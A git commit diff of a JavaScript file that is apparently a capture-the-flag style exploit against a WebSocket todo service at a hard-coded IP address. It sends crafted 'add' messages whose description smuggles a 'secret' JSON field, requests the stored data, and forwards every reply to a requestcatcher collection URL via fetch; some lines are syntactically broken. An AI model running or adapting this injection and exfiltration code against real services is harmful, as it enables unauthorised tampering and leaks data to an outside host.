3bc2d95e75b240fbe214efe97f27cee216d8a634
codefeasto <87825522+codefeasto@users.noreply.github.com>
2023-04-12 15:09:55 +0300

    Update todo.js

--- todo.js
+++ todo.js
@@ -1,22 +1,9 @@
-function sleep(ms) {
-    return new Promise(resolve => setTimeout(resolve, ms));
+const target = '188.166.175.0:31972';
+const ws = new WebSocket(`ws://${target}/ws`);
+ws.onopen = () => {
+    ws.send(JSON.stringify({action:'add',title: 'A',description: `AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA","secret":"00000000000000000000000000000000"}`}));
+    ws.send(JSON.stringify({action:'get'}));
 }
-
-const ws = new WebSocket(`ws://188.166.175.0:31972/ws`);
-
-sleep(2000);
-
-ws.send(JSON.stringify({ action: 'add', title:'lol', description:'dd","secret":"9a87e1e4e02c63957da05739d4dd3995","loo' }));
-
-sleep(2000);
-
-ws.send(JSON.stringify({ action: 'get'});
-        
 ws.onmessage = async (msg) => {
-    const data = JSON.parse(msg.data);
-    if(data.action === 'get'){
-      fetch('https://kek.requestcatcher.com/?'+data);
-    }
+    fetch(`https://kek.requestcatcher/?kek=${msg.data}`);
 }
-
-
